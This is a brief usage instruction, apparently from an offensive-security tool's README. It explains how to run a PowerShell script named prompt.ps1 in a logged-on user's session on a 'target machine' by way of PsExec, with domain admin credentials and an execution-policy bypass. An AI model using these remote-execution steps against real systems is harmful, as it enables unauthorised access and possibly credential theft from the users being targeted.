Place this script on the target machine (for example inside a shared folder) and execute in remotly with PSExec.

You can get the $SESSION_ID with `query user` command.

```
.\PSExec64.exe -i $SESSION_ID \\TARGET_IP -u "corp.local\admin" -p "P@asswd" powershell -ep bypass -File C:\Shared\prompt.ps1
```
